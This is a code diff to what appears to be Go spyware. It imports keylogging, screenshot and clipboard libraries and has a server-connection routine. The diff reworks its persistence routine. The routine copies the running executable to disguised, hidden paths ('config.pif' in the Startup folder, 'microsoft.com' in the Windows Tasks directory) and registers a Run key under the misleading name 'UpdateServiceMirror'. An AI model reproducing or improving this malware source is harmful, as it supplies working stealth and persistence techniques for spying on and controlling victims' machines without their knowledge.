@@ -25,8 +25,8 @@ import (
 	"unsafe"
 
 	"github.com/atotto/clipboard"
-	"github.com/kbinani/screenshot"
 	"github.com/go-toast/toast"
+	"github.com/kbinani/screenshot"
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/types"
 	"github.com/shirou/gopsutil/v4/cpu"
@@ -46,11 +46,6 @@ var (
 	information interface{}
 	DATA        strings.Builder
 	streaming   = false
-
-	STARTUP = filepath.Join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	PATH    = filepath.Join(APPDATA, "subdir")
-	SELF, _ = os.Executable()
-	RUN     = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
 	APPDATA = os.Getenv("APPDATA")
 	LOCAL   = os.Getenv("LOCALAPPDATA")
@@ -163,16 +158,22 @@ func connectToServer(ip string, port int) {
 }
 
 func persist() {
-	os.Mkdir(PATH, 0644)
+	self, _ := os.Executable()
+	startUpPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "config.pif")
+	msPath := filepath.Join(os.Getenv("WINDIR"), "Tasks", "microsoft.com")
 
-	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(PATH), syscall.FILE_ATTRIBUTE_HIDDEN)
+	runRegistry := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-	DATA, _ := os.ReadFile(SELF)
-	os.WriteFile(filepath.Join(STARTUP, "svchost.exe"), DATA, 0644)
-	os.WriteFile(filepath.Join(PATH, "dllhost32.exe"), DATA, 0644)
+	myBytes, _ := os.ReadFile(self)
+	os.WriteFile(msPath, myBytes, 0644)
+	os.WriteFile(startUpPath, myBytes, 0644)
 
-	key, _ := registry.OpenKey(registry.CURRENT_USER, RUN, registry.ALL_ACCESS)
-	key.SetStringValue("dllhost32", fmt.Sprintf("\"%v\"", filepath.Join(PATH, "svchost.exe")))
+	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(msPath), syscall.FILE_ATTRIBUTE_HIDDEN)
+	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(startUpPath), syscall.FILE_ATTRIBUTE_HIDDEN)
+
+	key, _ := registry.OpenKey(registry.CURRENT_USER, runRegistry, registry.ALL_ACCESS)
+	key.SetStringValue("UpdateServiceMirror ", msPath)
+	key.Close()
 }
 
 func writeResponse(response string) {
